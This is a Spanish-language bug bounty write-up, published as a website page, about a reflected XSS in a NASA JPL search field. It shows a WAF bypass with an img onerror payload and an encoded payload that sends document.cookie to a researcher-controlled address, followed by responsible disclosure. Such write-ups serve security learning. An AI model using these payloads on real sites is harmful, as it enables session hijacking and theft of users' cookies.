---
layout: default
---

<div class="container">
<article>
  <a href="../../../es/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>NASA JPL: Exfiltración de Cookies vía XSS</h1>
    <p style="color: var(--p3); font-weight: 600;">NASA JPL - Solar System Dynamics (SSD) Group</p>
  </div>

  <div class="bounty-content">
    <h2>🔍 Búsqueda Inicial</h2>
    <p>Como en cualquier programa de bug bounty, lo primero fue usar la página como un usuario normal. El campo de búsqueda destacó, así que lo probamos:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/search.png" alt="Campo de Búsqueda">
    <p>Al incluir varios caracteres como <code>" / ' > <</code>, observamos que se reflejaban en el código fuente sin saneamiento:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/ReflectedChar.png" alt="Caracteres Reflejados">

    <h2>🛡️ Bypass del WAF</h2>
    <p>Inicialmente, intentamos usar un payload simple como <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, pero el <strong>WAF de la NASA</strong> bloqueó la solicitud:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/BlockedWAF.png" alt="Bloqueado por el WAF">
    <p>Para evadirlo, probamos varios encodings y diferentes etiquetas. Descubrimos que el uso de la etiqueta <code>&lt;img&gt;</code> con un evento <code>onerror</code> lograba burlar el firewall:</p>
    <pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/WAFBypass.png" alt="Alerta de Bypass del WAF">

    <h2>🚀 Exploit Final (Exfiltración de Cookies)</h2>
    <p>Una vez tuvimos un XSS funcional, decidimos escalarlo para robar las cookies de sesión. Para evitar caracteres sospechosos en la URL, usamos <code>String.fromCharCode</code> para codificar nuestro payload:</p>
    <pre><code>&lt;img src=x onerror=document.location=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,63,99,61)+document.cookie&gt;</code></pre>
    <p>Esto redirigía a la víctima (y sus cookies) a nuestro servidor controlado. Aquí está la petición de exfiltración capturada en nuestros logs:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/ExfiltrationRequest.png" alt="Petición de Exfiltración">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/ExfiltrationCookies.png" alt="Cookies Exfiltradas">

    <h2>📜 Reconocimiento Oficial</h2>
    <p>Tras reportar la vulnerabilidad de forma responsable, la NASA la investigó y corrigió. Recibimos una carta oficial de agradecimiento del grupo <strong>NASA JPL Solar System Dynamics</strong>.</p>
    
    <div class="pdf-container">
      <iframe src="../../../assets/pdf/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
    </div>
    
    <div style="text-align: center; margin-top: 1rem;">
      <a href="../../../assets/pdf/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
    </div>

    <h2>🤝 Detalle de Colaboración</h2>
    <p>Esta investigación fue realizada en una colaboración conjunta:</p>
    <ul>
      <li><strong>{{ site.researchers.ivan.name }}</strong> (Investigador Principal)</li>
      <li><strong>{{ site.researchers.diego.name }}</strong> (Analista de Seguridad)</li>
    </ul>

    <div class="card-grid" style="margin-top: 3rem;">
      <div class="glass-card">
        <small>Impacto</small>
        <strong>Secuestro de Sesión (Session Hijacking)</strong>
      </div>
      <div class="glass-card">
        <small>Severidad</small>
        <strong>P3 (Media)</strong>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Imagen Ampliada">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
